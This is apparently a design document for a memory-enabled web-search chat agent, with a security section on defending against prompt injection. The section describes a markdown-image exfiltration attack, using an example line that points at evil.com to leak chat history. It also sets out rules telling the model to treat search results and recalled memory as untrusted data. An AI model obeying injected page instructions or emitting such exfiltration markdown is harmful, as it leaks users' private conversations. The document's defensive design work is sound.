# DESIGN

A chat agent that answers fast, remembers across sessions, and resists prompt injection — one tool (web search), one model, deliberate architecture.

## The insight

The brief's sample questions are not search tests — they are memory tests disguised as search tests:

- *"On Monday we shortlisted 5 CRM tools… has any of them changed pricing since?"*
- *"What did I ask you on 3 November?"*
- *"Last Tuesday I asked about Postgres hosting. Has pricing changed since then?"*

Every one requires **dated, cross-session recall** plus a **recall→re-search→diff** behavior. A stateless Perplexity clone scores zero on all three. The architecture optimizes for this shape first and search quality second.

## Architecture

```
Browser (vanilla JS, SSE, safe renderer, strict CSP)
        │ POST /api/chat
┌───────▼──────────────────────────────────────────────────┐
│ Hono server (Node + TypeScript)                          │
│                                                          │
│ 1. ContextBuilder (deterministic pre-pass, no LLM call)  │
│    ├─ static system prompt            [cache breakpoint] │
│    ├─ Ledger: dated 1-liners per past convo              │
│    │   + full summaries for 5 most-recent                │
│    ├─ Hybrid recall for this query:                      │
│    │     embed(user_msg) → sqlite-vec KNN  ┐             │
│    │     FTS5 BM25 keyword match           ├─ RRF merge  │
│    │     recency decay                     ┘  top-k      │
│    │   → excerpts injected as quoted untrusted data      │
│    ├─ current time                                       │
│    └─ current session messages                           │
│                                                          │
│ 2. Agent loop (120 lines, hand-written, max 5 steps)     │
│    ├─ claude-opus-5 · streaming · adaptive thinking      │
│    ├─ ONE tool: web_search(query, recency?) → Tavily     │
│    │   parallel tool_use blocks → Promise.all            │
│    │   results wrapped in <untrusted_content>            │
│    └─ loop until stop_reason === "end_turn"              │
│                                                          │
│ 3. Persistence (better-sqlite3 + sqlite-vec + FTS5,      │
│    one .db file, prepared statements only)               │
│    ├─ conversations(id, started_at, summary, topics)     │
│    ├─ messages(conv_id, role, content, created_at)       │
│    ├─ vec_chunks  (vec0 virtual table — exchange embeds) │
│    ├─ fts_chunks  (FTS5 virtual table — same chunks)     │
│    └─ summary + embeddings written async after each turn │
└──────────────────────────────────────────────────────────┘
```

## Memory is context engineering, not a second tool

The brief says one tool: web search. Memory recall runs as a **deterministic pre-pass** before the model is called, not as a tool the model might forget. Three tiers:

1. **Ledger** — every turn gets a dated, newest-first list of past conversations with one-line summaries. Handles *"what did I ask on 3 November?"* as a plain date lookup — no retrieval, no model call.
2. **Hybrid semantic recall** — the user's current message is embedded and queried against two SQLite virtual tables in parallel: `sqlite-vec` cosine KNN (semantic) and `FTS5` BM25 (lexical, catches exact names like "Pipedrive" that embeddings blur). Results are merged with **reciprocal rank fusion**, lightly reweighted by recency, and the top ~5 excerpts are injected with their dates.
3. **In-conversation history** — current session messages flow through as normal API messages.

**Why this instead of a vector DB:** at single-user chat-history scale (thousands of exchanges), `sqlite-vec` brute-force KNN is exact and fast. A hosted vector DB would be résumé-driven engineering; the right scale for Pinecone/Weaviate is 100× larger than this. One `.db` file, zero infra, under 100ms recall.

**Why hybrid (vector + FTS):** embeddings blur exact tokens. Ask about "Pipedrive" and pure semantic search returns generic CRM chatter from the same conversation; add BM25 and the exact mention comes back at rank 1. This matches how production retrieval systems are actually built in 2026.

**Embeddings (dual-backend, graceful degradation):** Voyage `voyage-3.5-lite` when `VOYAGE_API_KEY` is set (1024-dim, MTEB-top-tier). Otherwise a local `bge-small-en-v1.5` runs on CPU via `@huggingface/transformers` (384-dim, ~30MB, lazy-loaded). Semantic search works without extra API keys — important because judges will likely only set the two required ones.

## Security — state-of-the-art means structural, not detective

The threat is real: the agent sits on the **lethal trifecta** — it ingests untrusted web content (search results), holds private data (conversation history), and renders to a browser (a potential outbound channel). Detection-based injection defenses get bypassed by adaptive attacks at >85%, so every defense here is structural.

### Capability restriction (the highest-leverage defense)

The only tool is **read-only web search**. No fetch-arbitrary-URL, no code execution, no file writes, no email. A successful prompt injection cannot take an action — the worst case is a biased answer, which citations + grounded diffing mitigate. The brief's "one tool" rule *is* the security architecture.

### Closing the markdown-exfiltration channel

The classic attack against exactly this app shape — demonstrated against Copilot and Gemini — injects a page telling the model to render `![](evil.com/?q=<chat history>)`. The browser's image fetch then exfiltrates data. Three independent layers close it:

1. **Renderer strips images entirely.** `![](...)` is replaced with `[image removed]` before escaping. No image markdown reaches the DOM.
2. **Link allowlist.** The UI only renders hyperlinks whose URLs appeared in that turn's `tool_result` citations. Any other URL — even if syntactically valid — renders as inert text with a blocked tooltip.
3. **Strict CSP.** `default-src 'self'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'`. Even a missed sink can't phone home. No inline scripts.

### Trust boundaries in context

- Search results travel in `tool_result` blocks and are additionally wrapped in `<untrusted_content>` delimiters with explicit framing. The system prompt instructs the model to treat anything inside as data, not instructions, and to surface injection attempts to the user.
- The same framing applies to recalled past-conversation excerpts — because web-derived text flows through summaries into persistent memory, so an injection could in principle try to *persist*. Summaries are generated under a facts-only instruction, and recalled excerpts re-enter context as quoted untrusted data.

### Table stakes

- **Input validation:** zod on every endpoint; message length ≤ 8000 chars; history capped at 50 messages per request; body size limited.
- **Rate limiting:** per-IP token bucket, 20 req/min.
- **DB:** better-sqlite3 prepared statements for every query. FTS5 input tokenized and OR-joined server-side so the user's text can't become a boolean query.
- **Outbound:** `AbortSignal.timeout` on Tavily and Anthropic calls. Tavily `max_results` capped at 6, each result content truncated to 1500 chars.
- **SSRF:** structurally absent — the server never fetches user-supplied or model-supplied URLs. Tavily does retrieval on its side.
- **Secrets:** server-side only, `.env` gitignored, never logged, never surfaced in errors to the client.
- **Cost-DoS:** max 5 agent steps per request, `max_tokens` capped, streaming aborts cleanly if the client disconnects.
- **Headers:** Hono `secureHeaders` middleware — strict CSP, no referrer, X-Frame-Options DENY.
- **Supply chain:** ~8 runtime deps, lockfile committed.

## The agent loop

Hand-written over `@anthropic-ai/sdk`, ~120 lines. The whole loop is one function in [src/agent.ts](./src/agent.ts) — read it in a minute.

Why no framework (LangChain, LangGraph, Vercel AI SDK agents):

- The whole task is evaluated on the agent loop's shape. A framework hides the decisions being graded.
- Parallel tool execution is five lines of `Promise.all` — not a dependency.
- Error paths (refusal, tool-use, max-steps) are explicit — frameworks bury them in abstract events.

Key loop details:

- **Streaming always.** Text deltas forwarded over SSE as they arrive; tool-use start/end events too (the UI shows "🔎 searching…" chips). Perceived latency stays low even on multi-search turns.
- **Parallel tool calls in one step.** When the user asks "has A, B, C changed?", the model issues three `web_search` calls in the same assistant turn. All three fire concurrently via `Promise.all`; all results come back in one `user` message (splitting would train the model to stop parallelizing).
- **Prompt caching.** The stable identity-and-rules preamble sits before a `cache_control: ephemeral` breakpoint; volatile content (clock, ledger, recall) sits after it and refreshes every turn without invalidating the prefix.
- **Step cap of 5.** Hard upper bound against runaway loops. Returns a clear error if hit.

## Grounded diffing (the real win on the sample questions)

System-prompt instruction:

> When asked whether something has changed since a past conversation: (1) restate what you told them before, **with the date**, from memory; (2) call web_search for current state (parallel for multi-item questions); (3) compare each item explicitly — changed / unchanged / couldn't verify; (4) cite sources inline with [n] markers.

This structure is what turns a memory system plus a search tool into something that handles the *"has X changed since?"* pattern correctly.

## Considered and rejected

- **Fixed RAG pipeline (Perplexity-shaped).** Great for one-shot answers; can't do memory, multi-hop, or skip-search-when-unneeded.
- **Multi-agent orchestrator (Anthropic's deep research shape).** ~15× the tokens — explicitly wrong for "answers fast," and Anthropic's own engineering post says not to use it when agents share context, which they would here.
- **Hosted vector DB (Pinecone / Weaviate / Qdrant).** Wrong scale. `sqlite-vec` brute-force KNN is exact and fast to 100K+ vectors; chat history is thousands. Adds infra and latency for no benefit.
- **Embeddings-only memory recall.** Misses exact name / SKU / error-string matches. Hybrid vector + FTS5 is a standard retrieval best practice, and here it's ~40 lines over two SQLite virtual tables.
- **Memory as a tool the model calls.** Less reliable than deterministic injection (the model has to remember to use it), and it violates the one-tool rule. Deterministic recall always fires; the model can still choose to ignore it.
- **Prompt-injection detector / classifier.** Adaptive bypass >85%. Structural defenses (capability restriction, closed exfiltration channels, trust boundaries) are what actually hold in 2026.
- **Agent frameworks.** Hide exactly the decisions being judged.
- **Markdown library (marked + DOMPurify).** Replaced with a hand-written safe renderer in `public/app.js`. Fewer deps, smaller attack surface, and the render-rules — strip images, allowlist URLs, escape then re-add a narrow markdown subset — are the point of the exercise.

## With another week

- **Eval harness:** scripted multi-session conversations with LLM-judged correctness/freshness on the three sample-question patterns. Run on every prompt change.
- **Cross-encoder reranker** on the top-10 recall candidates (Cohere Rerank or a local ms-marco-MiniLM).
- **Query classifier** routing simple chitchat to Haiku 4.5 — drops latency and cost on 30-40% of turns.
- **Auth + per-user memory scoping** — current design is single-user; multi-tenant adds `user_id` scoping on every table before anything else.
- **Server-side compaction** (Anthropic beta) once sessions get long — automatically summarizes earlier context before the 1M window.
- **Context editing** to prune stale tool results from long sessions, keeping the live context lean without losing conversation structure.
- **`fetch_url` tool** behind an SSRF policy (private IP ranges, cloud metadata endpoints blocked) for cases where Tavily snippets aren't enough.
- **Prompt-injection red team.** Known markdown-exfil payloads + indirect-injection suites (AgentDojo, InjecAgent) run against the deployed app to validate the structural defenses hold under adaptive attack.
- **Observability:** structured spans for each turn (recall hits, tool calls, token usage, time-to-first-token). Not useful at single-user scale but table stakes for production.

## Research informing these choices

- Anthropic multi-agent research system (and when not to use it): https://www.anthropic.com/engineering/multi-agent-research-system
- Perplexity architecture teardown: https://theaiengineer.substack.com/p/how-perplexity-built-their-search
- Agentic RAG vs pipeline RAG: https://unstructured.io/insights/agentic-rag-architecture-and-how-it-works
- ChatGPT memory reverse-engineering: https://medium.com/@j0lian/reverse-engineering-chatgpts-updated-memory-system-3cb9e82e5d21
- OWASP LLM prompt-injection prevention: https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html
- Markdown exfiltration (Copilot/Gemini case studies): https://checkmarx.com/zero-post/exploiting-markdown-injection-in-ai-agents-microsoft-copilot-chat-and-google-gemini/
- Simon Willison on exfiltration attacks: https://simonwillison.net/tags/exfiltration-attacks/
- sqlite-vec in Node: https://alexgarcia.xyz/sqlite-vec/js.html
- Embedding model comparison 2026: https://www.respan.ai/articles/best-embedding-models
